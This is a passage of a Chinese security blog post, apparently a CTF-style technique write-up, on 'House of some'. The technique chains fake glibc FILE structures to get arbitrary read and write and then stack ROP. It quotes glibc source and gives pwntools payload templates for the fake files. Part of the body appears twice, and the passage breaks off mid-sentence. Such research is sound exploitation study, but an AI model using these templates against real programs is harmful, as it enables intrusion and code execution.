&gt; fp-&gt;_IO_write_base</code>来使得触发OVERFLOW就会出现无限递归，所以不可行，我们需要采取另一个分支，即</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) <span class=\"comment\">// 不可行</span></span><br><span class=\"line\">\t   || (_IO_vtable_offset (fp) == <span class=\"number\">0</span>                      <span class=\"comment\">// 使用||之后的分支</span></span><br><span class=\"line\">\t       &amp;&amp; fp-&gt;_mode &gt; <span class=\"number\">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class=\"line\">\t   )</span><br><span class=\"line\">\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>\n\n<p>那么实现任意地址读的fake file设置如下</p>\n<ul>\n<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，设置为<code>0</code>即可（与apple2相同）</li>\n<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap</code>地址，使得调用<code>_IO_wfile_overflow</code>即可（注意此处与apple2不同的是，此处的vtable不能加偏移，否则会打乱<code>_IO_SYSREAD</code>的调用）</li>\n<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(_wide_data + 0x18) = 0</code>（与apple2相同）</li>\n<li><code>_wide_data-&gt;_IO_write_ptr</code>设置为大于<code>_wide_data-&gt;_IO_write_base</code>，即满足<code>*(_wide_data + 0x20) &gt; *(_wide_data + 0x18)</code>（注意此处不同）</li>\n<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(_wide_data + 0x30) = 0</code>（与apple2相同）</li>\n<li><code>_wide_data-&gt;_wide_vtable</code>设置为任意一个包含<code>_IO_new_file_underflow</code>，其中原生的vtable就有，设置成<code>_IO_file_jumps-0x48</code>即可</li>\n<li><code>_vtable_offset</code>设置为<code>0</code></li>\n<li><code>_IO_buf_base</code>与<code>_IO_buf_end</code>设置为你需要写入的地址范围</li>\n<li><code>_chain</code>设置为你下一个触发的fake file地址</li>\n<li><code>_IO_write_ptr &lt;= _IO_write_base</code>即可</li>\n<li><code>_fileno</code>设置为<code>0</code>，表示<code>read(0, buf, size)</code></li>\n<li><code>_mode</code>设置为<code>2</code>，满足<code>fp-&gt;_mode &gt; 0</code>即可</li>\n</ul>\n<p>一个任意地址写的fake file模板如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_file_read = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _flags</span></span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_base</span></span><br><span class=\"line\">    <span class=\"number\">0x28</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_ptr</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">0x38</span>: 任意地址写的起始地址, <span class=\"comment\"># _IO_buf_base</span></span><br><span class=\"line\">    <span class=\"number\">0x40</span>: 任意地址写的终止地址, <span class=\"comment\"># _IO_buf_end</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"number\">0x70</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _fileno</span></span><br><span class=\"line\">    <span class=\"number\">0x82</span>: <span class=\"string\">b&quot;\\x00&quot;</span>, <span class=\"comment\"># _vtable_offset</span></span><br><span class=\"line\">    <span class=\"number\">0xc0</span>: <span class=\"number\">2</span>, <span class=\"comment\"># _mode</span></span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: wide_data的地址, <span class=\"comment\"># _wide_data</span></span><br><span class=\"line\">    <span class=\"number\">0x68</span>: 下一个调用的fake file地址, <span class=\"comment\"># _chain</span></span><br><span class=\"line\">    <span class=\"number\">0xd8</span>: _IO_wfile_jumps, <span class=\"comment\"># vtable</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_wide_data = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xe0</span>: _IO_file_jumps - <span class=\"number\">0x48</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"构造任意地址读的fake-file\"><a href=\"#构造任意地址读的fake-file\" class=\"headerlink\" title=\"构造任意地址读的fake file\"></a>构造任意地址读的fake file</h2><p>这个就很简单了，以前也有这些研究，利用<code>_IO_write_base</code>和<code>_IO_write_ptr</code>实现任意地址读，这里给出构造模板，具体原理网上有很多教程</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_file_write = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>: <span class=\"number\">0x800</span> | <span class=\"number\">0x1000</span>, <span class=\"comment\"># _flags</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">0x20</span>: 需要泄露的起始地址, <span class=\"comment\"># _IO_write_base</span></span><br><span class=\"line\">    <span class=\"number\">0x28</span>: 需要泄露的终止地址, <span class=\"comment\"># _IO_write_ptr</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"number\">0x70</span>: <span class=\"number\">1</span>, <span class=\"comment\"># _fileno</span></span><br><span class=\"line\">    <span class=\"number\">0x68</span>: 下一个调用的fake file地址, <span class=\"comment\"># _chain</span></span><br><span class=\"line\">    <span class=\"number\">0xd8</span>: _IO_file_jumps, <span class=\"comment\"># vtable</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"FSOP！\"><a href=\"#FSOP！\" class=\"headerlink\" title=\"FSOP！\"></a>FSOP！</h2><p>我们已经有了任意地址读、任意地址写的fake file构造，那么只需要将其用<code>_chain</code>串起来就可以达成强大的攻击效果</p>\n<p>那么我将House of some的攻击流程分成4步（RWRWR过程）（这也是一个广泛的思路，拥有任意地址写就不止一个方法了）</p>\n<ul>\n<li>第一步  任意地址写<code>_chain</code>，这里可以写<code>_IO_list_all</code>或者stdin、stdout、stderr的<code>_chain</code>位置，在这一步需要在可控地址上布置一个任意地址写的Fake file，之后将Fake file地址写入上述位置</li>\n<li>第二步 扩展fake file链条并泄露栈地址，在第一步的中，我们只有一个fake file，并不能完成更复杂的操作，所以这一步我们需要写入两个fake file，一个用于泄露<code>environ</code>内的值（即栈地址），另一个用于写入下一个fake file</li>\n<li>第三步 泄露栈内数据，并寻找ROP起始地址，这一步同样需要写入两个fake file，一个任意地址读，读取栈上内存，另一个任意地址写，向栈上写ROP</li>\n<li>第三步 写入ROP，实现栈上ROP攻击！</li>\n</ul>\n<p>下图是攻击的图示，黄色代表<code>_IO_flush_all</code>还未遍历的FILE，黑色代表已经处理过的FILE</p>\n<p><img src=\"/p/house-of-some/House-of-some.png\" alt=\"House of some\"></p>\n<h1 id=\"简单的分析\"><a href=\"#简单的分析\" class=\"headerlink\" title=\"简单的分析\"></a>简单的分析</h1><p>这个链条是基于House of apple2基础上衍生的，为什么需要apple2呢？因为，在意外调用vtable的过程中，需要给vtable项加上偏移，但是<code>_IO_SYSREAD</code>等宏也是通过偏移索引，所以会导致偏移出错无法按照预定逻辑，那么就想到wide data内的vtable，修改此处的偏移可以不影响IO FILE的vtable。</p>\n<p>这个利用链条从源码中分析得出，不依赖二进制编译结果，以及可以无视加上wide data内的vtable的检查，这就导致了非常强大的泛用性。</p>\n<p>同时House of some带回了原生的FSOP流程（RWRWR过程），我们重新回到了起点——angelboy提出的FSOP原来的样子，利用chain把一个一个fake file串起来，通过多次的fake file调用<code>_IO_OVERFLOW</code>，实现二次泄露甚至多次泄露，使得我们游走在任意地址中，修改任意的地址内容！</p>\n<p>为何选择栈上ROP，因为这是最简单最有效最暴力的攻击方法，可以无需栈迁移，无视canary（任意读可以泄露，甚至我能控制写入起点，可以选择canary后面作为起点），最后栈溢出永不过时！</p>\n","excerpt":"","more":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>House of some是一条改进House of apple2的新链，也是一种攻击思路，效果十分显著，并且可以适用于未来的高版本，可以实现任意地址写，其中触发条件为</p>\n<ol>\n<li>已知glibc基地址</li>\n<li>可控的已知地址（可写入内容构造fake file）</li>\n<li>需要一次libc内任意地址写可控地址</li>\n<li>程序能正常退出或者通过exit()退出</li>\n</ol>\n<p>House of some具有以下优点：</p>\n<ol>\n<li>无视目前的<code>IO_validate_vtable</code>检查（wide_data的vtable加上检查也可以打）</li>\n<li>第一次任意地址写要求低</li>\n<li>最后攻击提权是栈上ROP，可以不需要栈迁移</li>\n<li>源码级攻击，不依赖编译结果</li>\n</ol>\n<p>自动化脚本(将于2024年2月1日发布)<a href=\"https://github.com/CsomePro/Some-of-House\">https://github.com/CsomePro/Some-of-House</a></p>\n<h1 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h1><h2 id=\"构造任意地址写的fake-file\"><a href=\"#构造任意地址写的fake-file\" class=\"headerlink\" title=\"构造任意地址写的fake file\"></a>构造任意地址写的fake file</h2><p>首先回顾一下House of apple2 <a href=\"https://bbs.kanxue.com/thread-273832.htm\">https://bbs.kanxue.com/thread-273832.htm</a></p>\n<p>其中有一条链是如下进行的</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_wfile_overflow</span><br><span class=\"line\">    _IO_wdoallocbuf</span><br><span class=\"line\">        _IO_WDOALLOCATE</span><br><span class=\"line\">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class=\"number\">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>\n\n<p>如果<code>fp-&gt;_wide_data-&gt;_wide_vtable</code>加上了检查，那么只能选择虚表内的函数进行执行，我们能够选什么呢？</p>\n<p>那么就需要<code>_IO_new_file_underflow</code>这个函数出场了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">_IO_new_file_underflow (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> count;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      __set_errno (EBADF);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> *(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Maybe we already have a push back pointer.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fp-&gt;_IO_save_base != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"built_in\">free</span> (fp-&gt;_IO_save_base);</span><br><span class=\"line\">\t  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">      _IO_doallocbuf (fp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class=\"line\"><span class=\"comment\">\t required by any standard.  My recollection is that</span></span><br><span class=\"line\"><span class=\"comment\">\t traditional Unix systems did this for stdout.  stderr better</span></span><br><span class=\"line\"><span class=\"comment\">\t not be line buffered.  So we do just that here</span></span><br><span class=\"line\"><span class=\"comment\">\t explicitly.  --drepper */</span></span><br><span class=\"line\">      _IO_acquire_lock (<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((<span class=\"built_in\">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class=\"line\">\t  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class=\"line\">\t_IO_OVERFLOW (<span class=\"built_in\">stdout</span>, EOF);</span><br><span class=\"line\"></span><br><span class=\"line\">      _IO_release_lock (<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_switch_to_get_mode (fp);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* This is very tricky. We have to adjust those</span></span><br><span class=\"line\"><span class=\"comment\">     pointers before we call _IO_SYSREAD () since</span></span><br><span class=\"line\"><span class=\"comment\">     we may longjump () out while waiting for</span></span><br><span class=\"line\"><span class=\"comment\">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class=\"line\">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class=\"line\">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class=\"line\">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class=\"line\">    = fp-&gt;_IO_buf_base;</span><br><span class=\"line\"></span><br><span class=\"line\">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class=\"line\">\t\t       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (count &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count == <span class=\"number\">0</span>)</span><br><span class=\"line\">\tfp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">\tfp-&gt;_flags |= _IO_ERR_SEEN, count = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  fp-&gt;_IO_read_end += count;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (count == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class=\"line\"><span class=\"comment\">\t handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class=\"line\"><span class=\"comment\">\t unset it.  */</span></span><br><span class=\"line\">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class=\"line\">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以发现在<code>_IO_new_file_underflow</code>函数内会调用<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code>宏其对应的常规read函数如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span></span><br><span class=\"line\">_IO_file_read (FILE *fp, <span class=\"type\">void</span> *buf, <span class=\"type\">ssize_t</span> size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class=\"number\">0</span>)</span><br><span class=\"line\">\t  ? __read_nocancel (fp-&gt;_fileno, buf, size)</span><br><span class=\"line\">\t  : __read (fp-&gt;_fileno, buf, size));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后是调用syscall(read)读，我们可以看到read的三个参数都是可控的</p>\n<ul>\n<li><code>fd</code>&#x3D;&gt;<code>fp-&gt;_fileno</code></li>\n<li><code>buf</code>&#x3D;&gt;<code>fp-&gt;_IO_buf_base</code></li>\n<li><code>size</code>&#x3D;&gt;<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code></li>\n</ul>\n<p>那么就可以构造一个任意地址写，那么有了任意地址写之后有啥用呢？FSOP！</p>\n<p>我们再回到<code>_IO_flush_all</code>函数观察一下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">_IO_flush_all (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  FILE *fp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class=\"line\">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class=\"line\">  _IO_lock_lock (list_all_lock);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (fp = (FILE *) _IO_list_all; fp != <span class=\"literal\">NULL</span>; fp = fp-&gt;_chain)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      run_fp = fp;</span><br><span class=\"line\">      _IO_flockfile (fp);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">\t   || (_IO_vtable_offset (fp) == <span class=\"number\">0</span></span><br><span class=\"line\">\t       &amp;&amp; fp-&gt;_mode &gt; <span class=\"number\">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class=\"line\">\t   )</span><br><span class=\"line\">\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class=\"line\">\tresult = EOF;</span><br><span class=\"line\"></span><br><span class=\"line\">      _IO_funlockfile (fp);</span><br><span class=\"line\">      run_fp = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class=\"line\">  _IO_lock_unlock (list_all_lock);</span><br><span class=\"line\">  _IO_cleanup_region_end (<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中的for循环我们可以看到对于<code>_IO_list_all</code>上的单向链表，通过了<code>_chain</code>串起来，并在<code>_IO_flush_all</code>中，会遍历链表上每一个FILE，如果条件成立，就可以调用<code>_IO_OVERFLOW(fp, EOF) </code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (fp = (FILE *) _IO_list_all; fp != <span class=\"literal\">NULL</span>; fp = fp-&gt;_chain) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">\t   || (_IO_vtable_offset (fp) == <span class=\"number\">0</span></span><br><span class=\"line\">\t       &amp;&amp; fp-&gt;_mode &gt; <span class=\"number\">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class=\"line\">\t   )</span><br><span class=\"line\">\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>那么接下来就开始构造一个实现任意地址写的fake file</p>\n<p>由于<code>_IO_new_file_underflow</code>内有一个<code>_IO_switch_to_get_mode</code>函数其中有这个分支</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (_IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br></pre></td></tr></table></figure>\n\n<p>如果还是使用<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>来使得触发OVERFLOW就会出现无限递归，所以不可行，我们需要采取另一个分支，即</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) <span class=\"comment\">// 不可行</span></span><br><span class=\"line\">\t   || (_IO_vtable_offset (fp) == <span class=\"number\">0</span>                      <span class=\"comment\">// 使用||之后的分支</span></span><br><span class=\"line\">\t       &amp;&amp; fp-&gt;_mode &gt; <span class=\"number\">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class=\"line\">\t   )</span><br><span class=\"line\">\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>\n\n<p>那么实现任意地址读的fake file设置如下</p>\n<ul>\n<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，设置为<code>0</code>即可（与apple2相同）</li>\n<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap</code>地址，使得调用<code>_IO_wfile_overflow</code>即可（注意此处与apple2不同的是，此处的vtable不能加偏移，否则会打乱<code>_IO_SYSREAD</code>的调用）</li>\n<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(_wide_data + 0x18) = 0</code>（与apple2相同）</li>\n<li><code>_wide_data-&gt;_IO_write_ptr</code>设置为大于<code>_wide_data-&gt;_IO_write_base</code>，即满足<code>*(_wide_data + 0x20) &gt; *(_wide_data + 